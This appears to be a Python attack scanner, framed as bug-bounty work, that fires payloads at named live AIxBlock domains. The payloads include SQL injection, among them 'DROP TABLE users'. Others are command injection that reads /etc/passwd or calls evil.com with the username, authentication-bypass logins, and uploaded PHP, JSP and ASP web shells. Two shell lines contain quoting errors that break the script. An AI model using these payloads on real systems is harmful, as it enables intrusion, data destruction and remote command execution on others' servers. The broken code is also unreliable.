#!/usr/bin/env python3
"""
AIxBlock Dark Web Vulnerability Scanner
Based on current dark web exploit trends and vulnerability databases
"""

import requests
import json
import time
import threading
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class AIxBlockDarkWebScanner:
    def __init__(self, base_urls):
        self.base_urls = base_urls
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        
    def log_vulnerability(self, vuln_type, url, payload, response, severity):
        """Log discovered vulnerability"""
        vuln = {
            'timestamp': datetime.now().isoformat(),
            'type': vuln_type,
            'url': url,
            'payload': payload,
            'response_code': response.status_code,
            'severity': severity,
            'evidence': response.text[:500] if response.text else "No response body"
        }
        self.vulnerabilities.append(vuln)
        print(f"üö® {severity.upper()}: {vuln_type} found at {url}")
        print(f"   Payload: {payload}")
        print(f"   Response: {response.status_code}")
        print("-" * 50)

    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        print(f"üîç Testing SQL injection on {url}")
        
        # SQLi payloads based on dark web trends
        sqli_payloads = [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' UNION SELECT username,password FROM users--",
            "admin'--",
            "admin' OR 1=1--",
            "' OR 1=1 LIMIT 1 OFFSET 0--",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
        ]
        
        for payload in sqli_payloads:
            try:
                # Test in URL parameters
                test_url = f"{url}?id={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Check for SQL error patterns
                error_patterns = [
                    r"mysql_fetch_array\(\)",
                    r"ORA-\d+",
                    r"Microsoft.*ODBC.*SQL Server",
                    r"SQLServer JDBC Driver",
                    r"PostgreSQL.*ERROR",
                    r"Warning.*mysql_.*",
                    r"valid MySQL result",
                    r"check the manual that corresponds to your MySQL server version",
                    r"SQL syntax.*near",
                    r"SQLException"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.log_vulnerability("SQL Injection", test_url, payload, response, "CRITICAL")
                        return True
                        
            except Exception as e:
                print(f"Error testing SQLi on {url}: {e}")
                
        return False

    def test_command_injection(self, url):
        """Test for command injection vulnerabilities"""
        print(f"üîç Testing command injection on {url}")
        
        # Command injection payloads from dark web analysis
        cmd_payloads = [
            "; ls -la",
            "& whoami",
            "` id `",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
            "& ping -c 5 127.0.0.1",
            "; sleep 5",
            "` sleep 5 `",
            "& nslookup $(whoami).evil.com",
            "; curl http://evil.com/$(whoami)"
        ]
        
        for payload in cmd_payloads:
            try:
                test_url = f"{url}?cmd={urllib.parse.quote(payload)}"
                start_time = time.time()
                response = self.session.get(test_url, timeout=15)
                end_time = time.time()
                
                # Check for command execution indicators
                if end_time - start_time > 4:  # Sleep command executed
                    self.log_vulnerability("Command Injection (Time-based)", test_url, payload, response, "CRITICAL")
                    return True
                    
                # Check for command output patterns
                output_patterns = [
                    r"uid=\d+.*gid=\d+",
                    r"root:x:0:0:",
                    r"bin:x:\d+:\d+:",
                    r"PING.*127\.0\.0\.1",
                    r"nslookup.*evil\.com"
                ]
                
                for pattern in output_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.log_vulnerability("Command Injection (Output-based)", test_url, payload, response, "CRITICAL")
                        return True
                        
            except Exception as e:
                print(f"Error testing command injection on {url}: {e}")
                
        return False

    def test_idor(self, url):
        """Test for Insecure Direct Object References"""
        print(f"üîç Testing IDOR on {url}")
        
        # IDOR testing patterns
        idor_tests = [
            {"param": "user_id", "values": [1, 2, 3, 999, 0, -1]},
            {"param": "project_id", "values": [1, 2, 3, 999, 0, -1]},
            {"param": "id", "values": [1, 2, 3, 999, 0, -1]},
            {"param": "file_id", "values": [1, 2, 3, 999, 0, -1]}
        ]
        
        for test in idor_tests:
            for value in test["values"]:
                try:
                    test_url = f"{url}?{test['param']}={value}"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for successful data access
                    if response.status_code == 200 and len(response.text) > 100:
                        # Look for sensitive data patterns
                        sensitive_patterns = [
                            r"password",
                            r"token",
                            r"secret",
                            r"key",
                            r"email",
                            r"phone",
                            r"ssn",
                            r"credit"
                        ]
                        
                        for pattern in sensitive_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self.log_vulnerability("IDOR", test_url, f"{test['param']}={value}", response, "HIGH")
                                return True
                                
                except Exception as e:
                    print(f"Error testing IDOR on {url}: {e}")
                    
        return False

    def test_xss(self, url):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"üîç Testing XSS on {url}")
        
        # XSS payloads from dark web analysis
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
        
        for payload in xss_payloads:
            try:
                test_url = f"{url}?q={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Check if payload is reflected in response
                if payload in response.text:
                    self.log_vulnerability("XSS (Reflected)", test_url, payload, response, "HIGH")
                    return True
                    
            except Exception as e:
                print(f"Error testing XSS on {url}: {e}")
                
        return False

    def test_race_conditions(self, url):
        """Test for race condition vulnerabilities"""
        print(f"üîç Testing race conditions on {url}")
        
        def make_request():
            try:
                response = self.session.post(url, json={"action": "create_project"}, timeout=10)
                return response.status_code, response.text
            except:
                return None, None
        
        # Send multiple requests simultaneously
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(10)]
            results = [future.result() for future in futures]
        
        # Check for successful responses (potential quota bypass)
        successful_responses = [r for r in results if r[0] == 200]
        if len(successful_responses) > 1:
            self.log_vulnerability("Race Condition", url, "10 simultaneous requests", 
                                type('Response', (), {'status_code': 200, 'text': f"{len(successful_responses)} successful responses"})(), "MEDIUM")
            return True
            
        return False

    def test_authentication_bypass(self, url):
        """Test for authentication bypass vulnerabilities"""
        print(f"üîç Testing authentication bypass on {url}")
        
        # Authentication bypass payloads
        auth_bypass_payloads = [
            {"username": "admin", "password": "' OR 1=1--"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin", "password": "admin' OR '1'='1"},
            {"username": "' OR 1=1--", "password": "anything"},
            {"username": "admin", "password": "admin' OR 1=1--"},
            {"username": "admin", "password": "admin' OR '1'='1'--"},
            {"username": "admin", "password": "admin' OR '1'='1' LIMIT 1--"},
            {"username": "admin", "password": "admin' OR '1'='1' LIMIT 1 OFFSET 0--"}
        ]
        
        for payload in auth_bypass_payloads:
            try:
                response = self.session.post(url, json=payload, timeout=10)
                
                # Check for successful authentication
                success_indicators = [
                    r"token",
                    r"session",
                    r"authenticated",
                    r"success",
                    r"welcome",
                    r"dashboard"
                ]
                
                for pattern in success_indicators:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.log_vulnerability("Authentication Bypass", url, str(payload), response, "CRITICAL")
                        return True
                        
            except Exception as e:
                print(f"Error testing auth bypass on {url}: {e}")
                
        return False

    def test_file_upload_vulnerabilities(self, url):
        """Test for file upload vulnerabilities"""
        print(f"üîç Testing file upload vulnerabilities on {url}")
        
        # Malicious file uploads
        malicious_files = [
            {"filename": "shell.php", "content": "<?php system($_GET['cmd']); ?>"},
            {"filename": "shell.jsp", "content": "<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>"},
            {"filename": "shell.asp", "content": "<% eval request("cmd") %>"},
            {"filename": "shell.py", "content": "import os; os.system(request.args.get('cmd'))"},
            {"filename": "shell.svg", "content": "<svg onload=alert('XSS')>"}
        ]
        
        for file_data in malicious_files:
            try:
                files = {'file': (file_data["filename"], file_data["content"])}
                response = self.session.post(url, files=files, timeout=10)
                
                if response.status_code == 200:
                    # Try to access the uploaded file
                    file_url = f"{url}/uploads/{file_data['filename']}"
                    file_response = self.session.get(file_url, timeout=10)
                    
                    if file_response.status_code == 200:
                        self.log_vulnerability("File Upload", url, file_data["filename"], file_response, "CRITICAL")
                        return True
                        
            except Exception as e:
                print(f"Error testing file upload on {url}: {e}")
                
        return False

    def scan_all_vulnerabilities(self):
        """Run comprehensive vulnerability scan"""
        print("üöÄ Starting AIxBlock Dark Web Vulnerability Scan")
        print("=" * 60)
        
        for base_url in self.base_urls:
            print(f"\nüéØ Scanning {base_url}")
            print("-" * 40)
            
            # Common endpoints to test
            endpoints = [
                f"{base_url}/api/v1/users",
                f"{base_url}/api/v1/projects",
                f"{base_url}/api/v1/models",
                f"{base_url}/api/v1/workflows",
                f"{base_url}/api/v1/auth/login",
                f"{base_url}/api/v1/upload",
                f"{base_url}/api/v1/flags"
            ]
            
            for endpoint in endpoints:
                try:
                    # Test each vulnerability type
                    self.test_sql_injection(endpoint)
                    self.test_command_injection(endpoint)
                    self.test_idor(endpoint)
                    self.test_xss(endpoint)
                    self.test_race_conditions(endpoint)
                    self.test_authentication_bypass(endpoint)
                    self.test_file_upload_vulnerabilities(endpoint)
                    
                except Exception as e:
                    print(f"Error scanning {endpoint}: {e}")
                    
        return self.vulnerabilities

    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        if not self.vulnerabilities:
            print("‚úÖ No vulnerabilities found")
            return
            
        print("\n" + "=" * 60)
        print("üîç VULNERABILITY SCAN REPORT")
        print("=" * 60)
        
        # Group by severity
        critical = [v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']
        high = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
        medium = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
        
        print(f"\nüö® CRITICAL: {len(critical)} vulnerabilities")
        for vuln in critical:
            print(f"   ‚Ä¢ {vuln['type']} at {vuln['url']}")
            
        print(f"\n‚ö†Ô∏è  HIGH: {len(high)} vulnerabilities")
        for vuln in high:
            print(f"   ‚Ä¢ {vuln['type']} at {vuln['url']}")
            
        print(f"\nüìä MEDIUM: {len(medium)} vulnerabilities")
        for vuln in medium:
            print(f"   ‚Ä¢ {vuln['type']} at {vuln['url']}")
            
        # Save detailed report
        report_file = f"aixblock_vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
            
        print(f"\nüìÑ Detailed report saved to: {report_file}")

def main():
    """Main execution function"""
    # AIxBlock target URLs based on bug bounty scope
    target_urls = [
        "https://api.aixblock.io",
        "https://workflow.aixblock.io", 
        "https://app.aixblock.io",
        "https://webhook.aixblock.io",
        "https://mcp.aixblock.io"
    ]
    
    scanner = AIxBlockDarkWebScanner(target_urls)
    vulnerabilities = scanner.scan_all_vulnerabilities()
    scanner.generate_report()
    
    print(f"\nüéØ Scan complete! Found {len(vulnerabilities)} potential vulnerabilities")
    print("üí° Review the detailed report for exploitation guidance")

if __name__ == "__main__":
    main()
